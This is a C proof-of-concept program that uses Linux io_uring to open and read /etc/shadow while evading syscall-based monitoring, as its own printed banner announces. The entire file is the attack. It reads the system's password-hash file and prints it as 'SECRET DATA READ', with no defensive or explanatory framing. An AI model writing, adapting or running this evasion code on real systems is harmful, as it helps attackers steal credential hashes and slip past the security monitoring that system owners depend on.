#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <liburing.h>

#define QUEUE_DEPTH 1
#define BLOCK_SZ 1024

int read_file_via_io_uring(const char *filename) {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int fd;
    char buffer[BLOCK_SZ];

    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) != 0) {
        printf("Failed to init io_uring\n");
        return 1;
    }

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_openat(sqe, AT_FDCWD, filename, O_RDONLY, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    fd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (fd < 0) {
        printf("Failed to open file: %s\n", filename);
        return 1;
    }

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, fd, buffer, BLOCK_SZ, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    printf("SECRET DATA READ: %s\n", buffer);

    close(fd);
    io_uring_queue_exit(&ring);
    return 0;
}

int main() {
    printf("=== Bypassing syscall monitoring via io_uring ===\n");
    read_file_via_io_uring("/etc/shadow");
    return 0;
}
